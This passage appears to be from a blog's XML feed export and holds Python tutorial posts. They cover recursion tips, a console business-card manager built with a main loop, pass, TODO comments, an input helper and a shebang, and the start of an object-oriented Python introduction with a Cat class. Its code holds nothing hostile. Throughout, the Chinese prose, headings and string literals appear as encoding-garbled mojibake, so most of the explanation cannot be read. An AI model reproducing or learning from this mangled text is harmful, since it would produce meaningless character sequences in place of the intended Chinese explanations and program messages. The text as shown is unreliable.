type="1"><li>é€’å½’å‡ºå£ï¼Œé€’å½’æˆªæ­¢æ¡ä»¶</li><li>é€’æ¨è¡¨è¾¾å¼</li></ol></li></ol><p>æç¤ºï¼šé€’å½’æ˜¯ä¸€ä¸ªç¼–ç¨‹æŠ€å·§ï¼Œåœ¨å¤„ç†ä¸ç¡®å®šçš„å¾ªç¯æ¡ä»¶æ—¶ï¼Œæ ¼å¤–æœ‰ç”¨ï¼Œä¾‹å¦‚:éå†æ•´ä¸ªæ–‡ä»¶ç›®å½•ç»“æ„</p>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python card manager</title>
      <link href="/blog/2020/03/21/programming/python/1.basic/9.cards_manager/"/>
      <url>/blog/2020/03/21/programming/python/1.basic/9.cards_manager/</url>
      
        <content type="html"><![CDATA[<h1 id="ç»¼åˆåº”ç”¨-åç‰‡ç®¡ç†ç³»ç»Ÿ">ç»¼åˆåº”ç”¨ â€”â€” åç‰‡ç®¡ç†ç³»ç»Ÿ</h1><h2 id="ç›®æ ‡">ç›®æ ‡</h2><p>ç»¼åˆåº”ç”¨å·²ç»å­¦ä¹ è¿‡çš„çŸ¥è¯†ç‚¹ï¼š</p><ul><li><strong>å˜é‡</strong></li><li><strong>æµç¨‹æ§åˆ¶</strong></li><li><strong>å‡½æ•°</strong></li><li><strong>æ¨¡å—</strong></li></ul><p>å¼€å‘ <strong>åç‰‡ç®¡ç†ç³»ç»Ÿ</strong></p><h2 id="ç³»ç»Ÿéœ€æ±‚">ç³»ç»Ÿéœ€æ±‚</h2><ul><li><ol type="1"><li>ç¨‹åºå¯åŠ¨ï¼Œæ˜¾ç¤ºåç‰‡ç®¡ç†ç³»ç»Ÿæ¬¢è¿ç•Œé¢ï¼Œå¹¶æ˜¾ç¤ºåŠŸèƒ½èœå•</li></ol></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">**************************************************</span><br><span class="line">æ¬¢è¿ä½¿ç”¨ã€åç‰‡ç®¡ç†ç³»ç»Ÿã€‘V1.0</span><br><span class="line"></span><br><span class="line">1. æ–°å»ºåç‰‡</span><br><span class="line">2. æ˜¾ç¤ºå…¨éƒ¨</span><br><span class="line">3. æŸ¥è¯¢åç‰‡</span><br><span class="line"></span><br><span class="line">0. é€€å‡ºç³»ç»Ÿ</span><br><span class="line">**************************************************</span><br></pre></td></tr></table></figure><ul><li><ol start="2" type="1"><li>ç”¨æˆ·ç”¨æ•°å­—é€‰æ‹©ä¸åŒçš„åŠŸèƒ½</li></ol></li><li><ol start="3" type="1"><li>æ ¹æ®åŠŸèƒ½é€‰æ‹©ï¼Œæ‰§è¡Œä¸åŒçš„åŠŸèƒ½</li></ol></li><li><ol start="4" type="1"><li>ç”¨æˆ·åç‰‡éœ€è¦è®°å½•ç”¨æˆ·çš„<strong>å§“å</strong>ã€<strong>ç”µè¯</strong>ã€<strong>QQ</strong>ã€<strong>é‚®ä»¶</strong></li></ol></li><li><ol start="5" type="1"><li>å¦‚æœæŸ¥è¯¢åˆ°æŒ‡å®šçš„åç‰‡ï¼Œç”¨æˆ·å¯ä»¥é€‰æ‹© <strong>ä¿®æ”¹</strong> æˆ–è€…<strong>åˆ é™¤</strong> åç‰‡</li></ol></li></ul><h2 id="æ­¥éª¤">æ­¥éª¤</h2><p>è‡ªé¡¶è€Œä¸‹ï¼Œå¤§åŠŸèƒ½æ¡†æ¶ç¼–å†™æµ‹è¯•å¥½ï¼Œå†å¯¹é€ä¸ªåŠŸèƒ½è¿›è¡Œ:ç¼–å†™ -&gt;æµ‹è¯•ã€‚</p><ol type="1"><li>æ¡†æ¶æ­å»ºå†™é¡¹ç›®æ—¶ï¼Œå¾€å¾€å…ˆæ­å»ºæ¡†æ¶ï¼šå¤§æ¦‚åŠŸèƒ½çš„æ³¨é‡Šï¼Œå¯¹æ¯ä¸ªåŠŸèƒ½çš„ç®€å•æç¤ºã€‚ç„¶åå†é€ä¸ªåŠŸèƒ½è¿›è¡Œ:ç¼–å†™-&gt; æµ‹è¯• -&gt; å®Œæˆã€‚ æ³¨:å¦‚æœåœ¨å¼€å‘ç¨‹åºæ—¶,ä¸å¸Œæœ›ç«‹åˆ»ç¼–å†™åˆ†æ”¯å†…éƒ¨çš„ä»£ç , å¯ä»¥ä½¿ç”¨ pass</li><li>æ–°å¢åç‰‡</li><li>æ˜¾ç¤ºæ‰€æœ‰åç‰‡</li><li>æŸ¥è¯¢åç‰‡</li><li>æŸ¥è¯¢æˆåŠŸåä¿®æ”¹ã€åˆ é™¤åç‰‡</li><li>è®© Python ç¨‹åºèƒ½å¤Ÿç›´æ¥è¿è¡Œ</li></ol><h2 id="æ¡†æ¶æ­å»º">01. æ¡†æ¶æ­å»º</h2><p><strong>ç›®æ ‡</strong></p><ul><li>æ­å»ºåç‰‡ç®¡ç†ç³»ç»Ÿ <strong>æ¡†æ¶ç»“æ„</strong><ol type="1"><li><strong>å‡†å¤‡æ–‡ä»¶</strong>ï¼Œç¡®å®šæ–‡ä»¶åï¼Œä¿è¯èƒ½å¤Ÿ<strong>åœ¨éœ€è¦çš„ä½ç½®</strong> ç¼–å†™ä»£ç </li><li>ç¼–å†™ <strong>ä¸»è¿è¡Œå¾ªç¯</strong>ï¼Œå®ç°åŸºæœ¬çš„<strong>ç”¨æˆ·è¾“å…¥å’Œåˆ¤æ–­</strong></li></ol></li></ul><h3 id="æ–‡ä»¶å‡†å¤‡">1.1 æ–‡ä»¶å‡†å¤‡</h3><ol type="1"><li>æ–°å»º <code>cards_main.py</code> ä¿å­˜ <strong>ä¸»ç¨‹åºåŠŸèƒ½ä»£ç </strong><ul><li><strong>ç¨‹åºçš„å…¥å£</strong></li><li>æ¯ä¸€æ¬¡å¯åŠ¨åç‰‡ç®¡ç†ç³»ç»Ÿéƒ½é€šè¿‡ <code>main</code> è¿™ä¸ªæ–‡ä»¶å¯åŠ¨</li></ul></li><li>æ–°å»º <code>cards_tools.py</code> ä¿å­˜<strong>æ‰€æœ‰åç‰‡åŠŸèƒ½å‡½æ•°</strong><ul><li>å°†å¯¹åç‰‡çš„<strong>æ–°å¢</strong>ã€<strong>æŸ¥è¯¢</strong>ã€<strong>ä¿®æ”¹</strong>ã€<strong>åˆ é™¤</strong>ç­‰åŠŸèƒ½å°è£…åœ¨ä¸åŒçš„å‡½æ•°ä¸­</li></ul></li></ol><h3 id="ç¼–å†™ä¸»è¿è¡Œå¾ªç¯">1.2 ç¼–å†™ä¸»è¿è¡Œå¾ªç¯</h3><ul><li>åœ¨ <code>cards_main</code> ä¸­æ·»åŠ ä¸€ä¸ª <strong>æ— é™å¾ªç¯</strong></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line"></span><br><span class="line">    <span class="comment"># TODO(å°æ˜) æ˜¾ç¤ºç³»ç»Ÿèœå•</span></span><br><span class="line"></span><br><span class="line">    action = <span class="built_in">input</span>(<span class="string">&quot;è¯·é€‰æ‹©æ“ä½œåŠŸèƒ½ï¼š&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;æ‚¨é€‰æ‹©çš„æ“ä½œæ˜¯ï¼š%s&quot;</span> % action)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># æ ¹æ®ç”¨æˆ·è¾“å…¥å†³å®šåç»­çš„æ“ä½œ</span></span><br><span class="line">    <span class="keyword">if</span> action <span class="keyword">in</span> [<span class="string">&quot;1&quot;</span>, <span class="string">&quot;2&quot;</span>, <span class="string">&quot;3&quot;</span>]:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">elif</span> action == <span class="string">&quot;0&quot;</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;æ¬¢è¿å†æ¬¡ä½¿ç”¨ã€åç‰‡ç®¡ç†ç³»ç»Ÿã€‘&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;è¾“å…¥é”™è¯¯ï¼Œè¯·é‡æ–°è¾“å…¥&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="å­—ç¬¦ä¸²åˆ¤æ–­">å­—ç¬¦ä¸²åˆ¤æ–­</h4><ol type="1"><li>ä½¿ç”¨ <code>in</code> é’ˆå¯¹ <strong>åˆ—è¡¨</strong> åˆ¤æ–­ï¼Œé¿å…ä½¿ç”¨<code>or</code> æ‹¼æ¥å¤æ‚çš„é€»è¾‘æ¡ä»¶</li><li>æ²¡æœ‰ä½¿ç”¨ <code>int</code> è½¬æ¢ç”¨æˆ·è¾“å…¥ï¼Œå¯ä»¥é¿å…<strong>ä¸€æ—¦ç”¨æˆ·è¾“å…¥çš„ä¸æ˜¯æ•°å­—</strong>ï¼Œå¯¼è‡´ç¨‹åºè¿è¡Œå‡ºé”™</li></ol><h4 id="pass">pass</h4><ul><li><code>pass</code>å°±æ˜¯ä¸€ä¸ªç©ºè¯­å¥ï¼Œä¸åšä»»ä½•äº‹æƒ…ï¼Œä¸€èˆ¬ç”¨åšå ä½è¯­å¥</li><li>æ˜¯ä¸ºäº†ä¿æŒç¨‹åºç»“æ„çš„å®Œæ•´æ€§</li></ul><h4 id="æ— é™å¾ªç¯">æ— é™å¾ªç¯</h4><ul><li>åœ¨å¼€å‘è½¯ä»¶æ—¶ï¼Œå¦‚æœ <strong>ä¸å¸Œæœ›ç¨‹åºæ‰§è¡Œå</strong> ç«‹å³é€€å‡º</li><li>å¯ä»¥åœ¨ç¨‹åºä¸­å¢åŠ ä¸€ä¸ª <strong>æ— é™å¾ªç¯</strong></li><li><strong>ç”±ç”¨æˆ·æ¥å†³å®š</strong> é€€å‡ºç¨‹åºçš„æ—¶æœº</li></ul><h4 id="todo-æ³¨é‡Š">TODO æ³¨é‡Š</h4><ul><li>PyCharm ä¸­ï¼Œåœ¨ <code>#</code> åè·Ÿä¸Š<code>TODO</code>ï¼Œç”¨äºæ ‡è®°éœ€è¦å»åšçš„å·¥ä½œã€‚ ç‚¹å‡» PyCharmå·¦ä¸‹è§’çš„å°çª—å£å›¾æ ‡ï¼Œä¾¿å¯ä»¥çŸ¥é“å“ªäº› TODOï¼Œå¹¶è·³è½¬ã€‚</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># TODO(ä½œè€…/é‚®ä»¶) æ˜¾ç¤ºç³»ç»Ÿèœå•</span></span><br></pre></td></tr></table></figure><h2 id="ä¿å­˜åç‰‡æ•°æ®çš„ç»“æ„">02. ä¿å­˜åç‰‡æ•°æ®çš„ç»“æ„</h2><p><strong>ç¨‹åºå°±æ˜¯ç”¨æ¥å¤„ç†æ•°æ®çš„ï¼Œè€Œå˜é‡å°±æ˜¯ç”¨æ¥å­˜å‚¨æ•°æ®çš„</strong></p><ul><li>ç¡®å®šæ•°æ®çš„å­˜å‚¨ç»“æ„ï¼Œæ˜¯æ­å»ºæ¡†æ¶åè¦åšçš„é‡è¦äº‹æƒ…ä¹‹ä¸€ã€‚</li><li>ä½¿ç”¨ <strong>å­—å…¸</strong> è®°å½• <strong>æ¯ä¸€å¼ åç‰‡</strong>çš„è¯¦ç»†ä¿¡æ¯</li><li>ä½¿ç”¨ <strong>åˆ—è¡¨</strong> ç»Ÿä¸€è®°å½•æ‰€æœ‰çš„<strong>åç‰‡å­—å…¸</strong></li></ul><p><strong>æ³¨æ„</strong></p><ol type="1"><li><strong>å¦‚æœæ‰€æœ‰ç›¸å…³æ“ä½œ</strong>ï¼Œéƒ½éœ€è¦ä½¿ç”¨è¿™ä¸ªæ•°æ®ï¼Œé‚£å®ƒåº”è¯¥<strong>å®šä¹‰åœ¨ç¨‹åºçš„é¡¶éƒ¨</strong></li><li><strong>ç¨‹åºåˆšè¿è¡Œæ—¶ï¼Œæ²¡æœ‰æ•°æ®</strong>ï¼Œæ‰€ä»¥æ˜¯<strong>ç©ºåˆ—è¡¨</strong></li></ol><p><strong>æ³¨æ„</strong></p><ul><li>åœ¨å‡½æ•°ä¸­ä½¿ç”¨ <code>return</code> è¡¨ç¤ºè¿”å›</li><li>å¦‚æœåœ¨ <code>return</code>åæ²¡æœ‰è·Ÿä»»ä½•å†…å®¹ï¼Œåªæ˜¯è¡¨ç¤ºè¯¥å‡½æ•°æ‰§è¡Œåˆ°æ­¤å°±ä¸å†æ‰§è¡Œåç»­çš„ä»£ç </li><li>è¦åˆ é™¤åç‰‡è®°å½•ï¼Œåªéœ€è¦æŠŠåˆ—è¡¨ä¸­å¯¹åº”çš„å­—å…¸åˆ é™¤å³å¯</li><li>è¦ä¿®æ”¹åç‰‡è®°å½•ï¼Œåªéœ€è¦æŠŠåˆ—è¡¨ä¸­å¯¹åº”çš„å­—å…¸ä¸­æ¯ä¸€ä¸ªé”®å€¼å¯¹çš„æ•°æ®ä¿®æ”¹å³å¯</li><li><strong>å¦‚æœç”¨æˆ·åœ¨ä½¿ç”¨æ—¶ï¼ŒæŸäº›åç‰‡å†…å®¹å¹¶ä¸æƒ³ä¿®æ”¹</strong>ï¼Œåº”è¯¥å¦‚ä½•åšå‘¢ï¼Ÿâ€”â€”æ—¢ç„¶ç³»ç»Ÿæä¾›çš„ <code>input</code> å‡½æ•°ä¸èƒ½æ»¡è¶³éœ€æ±‚ï¼Œé‚£ä¹ˆå°±æ–°å®šä¹‰ä¸€ä¸ªå‡½æ•°<code>input_card_info</code> å¯¹ç³»ç»Ÿçš„ <code>input</code>å‡½æ•°è¿›è¡Œæ‰©å±•</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">input_card_info</span>(<span class="params">dict_value, tip_message</span>):</span><br><span class="line"></span><br><span class="line">    <span class="string">&quot;&quot;&quot;è¾“å…¥åç‰‡ä¿¡æ¯</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    :param dict_value: å­—å…¸åŸæœ‰å€¼</span></span><br><span class="line"><span class="string">    :param tip_message: è¾“å…¥æç¤ºä¿¡æ¯</span></span><br><span class="line"><span class="string">    :return: å¦‚æœè¾“å…¥ï¼Œè¿”å›è¾“å…¥å†…å®¹ï¼Œå¦åˆ™è¿”å›å­—å…¸åŸæœ‰å€¼</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># 1. æç¤ºç”¨æˆ·è¾“å…¥å†…å®¹</span></span><br><span class="line">    result_str = <span class="built_in">input</span>(tip_message)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 2. é’ˆå¯¹ç”¨æˆ·çš„è¾“å…¥è¿›è¡Œåˆ¤æ–­ï¼Œå¦‚æœç”¨æˆ·è¾“å…¥äº†å†…å®¹ï¼Œç›´æ¥è¿”å›ç»“æœ</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(result_str) &gt; <span class="number">0</span>:</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> result_str</span><br><span class="line">    <span class="comment"># 3. å¦‚æœç”¨æˆ·æ²¡æœ‰è¾“å…¥å†…å®¹ï¼Œè¿”å› `å­—å…¸ä¸­åŸæœ‰çš„å€¼`</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> dict_value</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="æ–‡æ¡£æ³¨é‡Š">æ–‡æ¡£æ³¨é‡Š</h2><p>åœ¨å®Œæˆå‡½æ•°çš„åŠŸèƒ½ä¹‹åï¼Œæ·»åŠ æ³¨é‡Šï¼Œä»¥ä¾¿åˆ«äººæˆ–è€…è‡ªå·±ä»¥åé˜…è¯»ã€‚</p><h2 id="linux-ä¸Šçš„-shebang-ç¬¦å·">07. LINUX ä¸Šçš„ <code>Shebang</code>ç¬¦å·(<code>#!</code>)</h2><ul><li><code>#!</code>è¿™ä¸ªç¬¦å·å«åš <code>Shebang</code> æˆ–è€…<code>Sha-bang</code></li><li><code>Shebang</code> é€šå¸¸åœ¨ <code>Unix</code> ç³»ç»Ÿè„šæœ¬çš„ä¸­<strong>ç¬¬ä¸€è¡Œå¼€å¤´</strong> ä½¿ç”¨</li><li>æŒ‡æ˜ <strong>æ‰§è¡Œè¿™ä¸ªè„šæœ¬æ–‡ä»¶</strong> çš„<strong>è§£é‡Šç¨‹åº</strong></li></ul><h3 id="ä½¿ç”¨-shebang-çš„æ­¥éª¤">ä½¿ç”¨ Shebang çš„æ­¥éª¤</h3><ul><li><ol type="1"><li>ä½¿ç”¨ <code>which</code> æŸ¥è¯¢ <code>python3</code>è§£é‡Šå™¨æ‰€åœ¨è·¯å¾„</li></ol></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">which</span> python3</span><br></pre></td></tr></table></figure><ul><li><ol start="2" type="1"><li>ä¿®æ”¹è¦è¿è¡Œçš„ <strong>ä¸» pythonæ–‡ä»¶</strong>ï¼Œåœ¨ç¬¬ä¸€è¡Œå¢åŠ ä»¥ä¸‹å†…å®¹</li></ol></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/python3</span></span><br></pre></td></tr></table></figure><ul><li><ol start="3" type="1"><li>ä¿®æ”¹ <strong>ä¸» python æ–‡ä»¶</strong> çš„æ–‡ä»¶æƒé™ï¼Œå¢åŠ æ‰§è¡Œæƒé™</li></ol></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">chmod</span> +x cards_main.py</span><br></pre></td></tr></table></figure><ul><li><ol start="4" type="1"><li>åœ¨éœ€è¦æ—¶æ‰§è¡Œç¨‹åºå³å¯</li></ol></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./cards_main.py</span><br></pre></td></tr></table></figure><p>æ¨è: <a href="https://zhuanlan.zhihu.com/p/84292970">EffectivePython ç”¨ pythonic æ–¹å¼æ¥æ€è€ƒ</a> <ahref="https://zh.wikipedia.org/wiki/Shebang">Shebang wiki</a></p>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Object-oriented Python</title>
      <link href="/blog/2020/03/21/programming/python/2.object-oriented/01.oo_basic/"/>
      <url>/blog/2020/03/21/programming/python/2.object-oriented/01.oo_basic/</url>
      
        <content type="html"><![CDATA[<h2 id="introduction">Introduction</h2><p>ä¸‰è¦ç´ </p><ol type="1"><li><p>ç±»å è¿™ç±»äº‹ç‰©çš„åå­—ï¼Œ<strong>æ»¡è¶³å¤§é©¼å³°å‘½åæ³•</strong>å¤§é©¼å³°å‘½åæ³•</p><ol type="1"><li>æ¯ä¸ªå•è¯çš„é¦–å­—æ¯å¤§å†™, å¦‚: <code>StudentAge</code></li><li>å•è¯ä¸å•è¯ä¹‹é—´æ²¡æœ‰ä¸‹åˆ’çº¿ <ahref="https://blog.csdn.net/jerry11112/article/details/84985026">å¤§é©¼å³°å‘½åæ³•å’Œå°é©¼å³°å‘½åæ³•</a></li></ol></li><li><p>å±æ€§ è¿™ç±»äº‹ç‰©å…·æœ‰ä»€ä¹ˆæ ·çš„ç‰¹å¾</p></li><li><p>æ–¹æ³• è¿™ç±»äº‹ç‰©å…·æœ‰ä»€ä¹ˆæ ·çš„è¡Œä¸º</p></li></ol><h2 id="ä¸‰è¦ç´ çš„ç¡®å®š">ä¸‰è¦ç´ çš„ç¡®å®š</h2><ol type="1"><li>ç±»åçš„ç¡®å®š <strong>åè¯æç‚¼æ³•</strong>åˆ†æ<strong>æ•´ä¸ªä¸šåŠ¡æµç¨‹</strong>ï¼Œå‡ºç°çš„<strong>åè¯</strong>ï¼Œé€šå¸¸å°±æ˜¯æ‰¾åˆ°çš„ç±»ã€‚</li><li>å±æ€§çš„ç¡®å®šå¯¹<strong>å¯¹è±¡çš„ç‰¹å¾æè¿°</strong>ï¼Œé€šå¸¸å¯ä»¥å®šä¹‰æˆå±æ€§</li><li>æ–¹æ³•çš„ç¡®å®š<strong>å¯¹è±¡å…·æœ‰çš„è¡Œä¸º</strong>ï¼ˆåŠ¨è¯ï¼‰ï¼Œé€šå¸¸å¯ä»¥å®šä¹‰æˆ<strong>æ–¹æ³•</strong></li></ol><blockquote><p>æç¤ºï¼šéœ€æ±‚ä¸­æ²¡æœ‰æ¶‰åŠçš„å±æ€§æˆ–è€…æ–¹æ³•åœ¨è®¾è®¡ç±»æ—¶ï¼Œä¸éœ€è¦è€ƒè™‘</p></blockquote><h2 id="é¢å‘å¯¹è±¡ä¸‰å¤§ç‰¹æ€§">é¢å‘å¯¹è±¡ä¸‰å¤§ç‰¹æ€§</h2><p>é¢å‘å¯¹è±¡ä¸‰å¤§ç‰¹æ€§</p><ol type="1"><li><p>å°è£…ï¼šæ ¹æ®èŒè´£å°†å±æ€§å’Œæ–¹æ³•å°è£…åˆ°ä¸€ä¸ªæŠ½è±¡çš„ç±»ä¸­</p><ul><li>å®šä¹‰ç±»çš„å‡†åˆ™</li></ul></li><li><p>ç»§æ‰¿ï¼šå®ç°ä»£ç çš„é‡ç”¨ï¼Œç›¸åŒçš„ä»£ç ä¸éœ€è¦é‡å¤çš„ç¼–å†™</p><ul><li>è®¾è®¡ç±»çš„æŠ€å·§</li><li>å­ç±»é’ˆå¯¹è‡ªå·±ç‰¹æœ‰çš„éœ€æ±‚ï¼Œç¼–å†™ç‰¹å®šçš„ä»£ç </li></ul></li><li><p>å¤šæ€ï¼šä¸åŒçš„<strong>å­ç±»å¯¹è±¡</strong>è°ƒç”¨ç›¸åŒçš„<strong>çˆ¶ç±»æ–¹æ³•</strong>ï¼Œäº§ç”Ÿä¸åŒçš„æ‰§è¡Œç»“æœ</p><ul><li><strong>å¤šæ€</strong>å¯ä»¥<strong>å¢åŠ ä»£ç çš„çµæ´»åº¦</strong></li><li>ä»¥<strong>ç»§æ‰¿</strong>å’Œ<strong>é‡å†™çˆ¶ç±»æ–¹æ³•</strong>ä¸ºå‰æ</li><li>æ˜¯è°ƒç”¨æ–¹æ³•çš„æŠ€å·§ï¼Œ<strong>ä¸ä¼šå½±å“åˆ°ç±»çš„å†…éƒ¨è®¾è®¡</strong></li></ul></li></ol><h2 id="å®šä¹‰ç®€å•çš„ç±»">å®šä¹‰ç®€å•çš„ç±»</h2><p>æ–¹æ³•çš„å®šä¹‰æ ¼å¼å’Œä¹‹å‰å­¦ä¹ è¿‡çš„å‡½æ•°å‡ ä¹ä¸€æ ·</p><p>åŒºåˆ«åœ¨äºç¬¬ä¸€ä¸ªå‚æ•°å¿…é¡»æ˜¯ <code>self</code>ï¼Œå¤§å®¶æš‚æ—¶å…ˆè®°ä½ï¼Œç¨åä»‹ç»<code>self</code></p><p>æ³¨æ„ï¼šç±»åçš„å‘½åè§„åˆ™è¦ç¬¦åˆå¤§é©¼å³°å‘½åæ³•</p><p>ç¤ºä¾‹:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Cat</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;è¿™æ˜¯ä¸€ä¸ªçŒ«ç±»&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">eat</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;å°çŒ«çˆ±åƒé±¼&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">drink</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;å°çŒ«åœ¨å–æ°´&quot;</span>)</span><br><span class="line"></span><br><span class="line">tom = Cat()</span><br><span class="line">tom.drink()</span><br><span class="line">tom.eat()</span><br></pre></td></tr></table></figure><p>å¼•ç”¨æ¦‚å¿µçš„å¼ºè°ƒ :åœ¨é¢å‘å¯¹è±¡å¼€å‘ä¸­ï¼Œå¼•ç”¨çš„æ¦‚å¿µæ˜¯åŒæ ·é€‚ç”¨çš„</p><ul><li><p>åœ¨ Python ä¸­ä½¿ç”¨ç±»åˆ›å»ºå¯¹è±¡ä¹‹åï¼Œtomå˜é‡ä¸­ä»ç„¶è®°å½•çš„æ˜¯å¯¹è±¡åœ¨å†…å­˜ä¸­çš„åœ°å€</p></li><li><p>ä¹Ÿå°±æ˜¯ tom å˜é‡å¼•ç”¨äº†æ–°å»ºçš„çŒ«å¯¹è±¡</p></li><li><p>ä½¿ç”¨ printè¾“å‡ºå¯¹è±¡å˜é‡ï¼Œé»˜è®¤æƒ…å†µä¸‹ï¼Œæ˜¯èƒ½å¤Ÿè¾“å‡ºè¿™ä¸ªå˜é‡å¼•ç”¨çš„å¯¹è±¡æ˜¯ç”±å“ªä¸€ä¸ªç±»åˆ›å»ºçš„å¯¹è±¡ï¼Œä»¥åŠåœ¨å†…å­˜ä¸­çš„åœ°å€ï¼ˆåå…­è¿›åˆ¶è¡¨ç¤ºï¼‰</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">addr = <span class="built_in">id</span>(object1)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;%x&quot;</span> % addr) <span class="comment"># %x 16 è¿›åˆ¶</span></span><br><span class="line"></span><br><span class="line">æˆ–è€…ç›´æ¥</span><br><span class="line"><span class="built_in">print</span>(object1)</span><br></pre></td></tr></table></figure></li></ul><h2 id="ç»™å¯¹è±¡å¢åŠ å±æ€§">ç»™å¯¹è±¡å¢åŠ å±æ€§</h2><p>åœ¨ Python ä¸­ï¼Œè¦ç»™å¯¹è±¡å¢åŠ å±æ€§ï¼Œéå¸¸çš„å®¹æ˜“ï¼Œä½†æ˜¯ä¸æ¨èä½¿ç”¨</p><ul><li>å› ä¸ºï¼šå¯¹è±¡å±æ€§çš„å°è£…åº”è¯¥å°è£…åœ¨ç±»çš„å†…éƒ¨</li></ul><p>åªéœ€è¦åœ¨ç±»çš„å¤–éƒ¨çš„ä»£ç ä¸­ç›´æ¥é€šè¿‡ï¼Œè®¾ç½®ä¸€ä¸ªå±æ€§å³å¯</p><blockquote><ul><li><p>åœ¨æ—¥å¸¸å¼€å‘ä¸­ï¼Œä¸æ¨èåœ¨ç±»çš„å¤–éƒ¨ç»™å¯¹è±¡å¢åŠ å±æ€§</p><ul><li>å¦‚æœåœ¨è¿è¡Œæ—¶ï¼Œæ²¡æœ‰æ‰¾åˆ°å±æ€§ï¼Œç¨‹åºä¼šæŠ¥é”™</li></ul></li><li><p>å¯¹è±¡åº”è¯¥åŒ…å«æœ‰å“ªäº›å±æ€§ï¼Œåº”è¯¥<strong>å°è£…åœ¨ç±»çš„å†…éƒ¨</strong></p></li></ul></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Cat</span>:</span><br><span class="line">...</span><br><span class="line">tom = Cat()</span><br><span class="line">tom.name=<span class="string">&#x27;Tom&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="self">self</h2><p>self æ˜¯è°ƒç”¨æ–¹æ³•çš„å¯¹è±¡çš„å¼•ç”¨ï¼Œ ç”±å“ªä¸€ä¸ªå¯¹è±¡è°ƒç”¨çš„æ–¹æ³•ï¼Œæ–¹æ³•å†…çš„ selfå°±æ˜¯å“ªä¸€ä¸ªå¯¹è±¡çš„å¼•ç”¨</p><ul><li><p>åœ¨ç±»å°è£…çš„æ–¹æ³•å†…éƒ¨ï¼Œself 